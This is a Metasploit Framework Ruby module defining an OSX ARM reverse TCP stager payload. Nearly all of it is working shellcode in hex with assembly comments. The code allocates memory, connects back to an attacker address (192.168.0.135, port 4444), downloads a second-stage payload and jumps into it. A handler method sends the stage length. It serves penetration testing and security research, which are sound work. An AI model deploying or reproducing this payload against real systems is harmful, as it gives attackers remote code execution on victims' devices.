##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# OSX reverse TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_ARMLE,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 66, 'n'    ],
              'LHOST' => [ 68, 'ADDR' ],
            },
          'Payload' =>
          [
            # mmap
            0xe3a0c0c5, # mov r12, #0xc5
            0xe0200000, # eor r0, r0, r0
            0xe3a01502, # mov r1, #0x2, 10
            0xe3a02007, # mov r2, #0x7
            0xe3a03a01, # mov r3, #0x1, 20
            0xe3e04000, # mvn r4, #0x0
            0xe0255005, # eor r5, r5, r5
            0xef000080, # swi 128

            # store mmap address
            0xe1a0b000, # mov r11, r0

            # socket
            0xe3a00002, # mov r0, #0x2
            0xe3a01001, # mov r1, #0x1
            0xe3a02006, # mov r2, #0x6
            0xe3a0c061, # mov r12, #0x61
            0xef000080, # swi 128

            # store socket
            0xe1a0a000, # mov r10, r0
            0xeb000001, # bl _connect

            # port 4444
            0x5c110200,

            # host 192.168.0.135
            0x8700a8c0,

            # connect
            0xe1a0000a, # mov r0, r10
            0xe1a0100e, # mov r1, lr
            0xe3a02010, # mov r2, #0x10
            0xe3a0c062, # mov r12, #0x62
            0xef000080, # swi 128
            0xe3500000, # cmp r0, #0x0
            0x1a000012, # bne _exit

            # read length
            0xe3a0c003, # mov r12, #0x3
            0xe1a0000a, # mov r0, r10
            0xe1a0100b, # mov r1, r11
            0xe3a02004, # mov r2, #0x4
            0xef000080, # swi 128

            # setup download
            0xe49b9000, # ldr r9, [r11], #0
            0xe1a0800b, # mov r8, r11

            # download stage
            0xe3a0c003, # mov r12, #0x3
            0xe1a0000a, # mov r0, r10
            0xe1a01008, # mov r1, r8
            0xe1a02009, # mov r2, r9
            0xef000080, # swi 128
            0xe3500000, # cmp r0, #0x0
            0xba000004, # blt _exit
            0xe0888000, # add r8, r8, r0
            0xe0499000, # sub r9, r9, r0
            0xe3590000, # cmp r9, #0x0
            0x1afffff4, # bne _readmore

            # jump to stage
            0xe28bf000, # add pc, r11, #0x0

            # exit process
            0xe3a0c001, # mov r12, #0x1
            0xef000080, # swi 128
          ].pack("V*")

        }
      ))
  end

  def handle_intermediate_stage(conn, payload)

    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    Rex::ThreadSafe.sleep(0.5)

    return true
  end

end
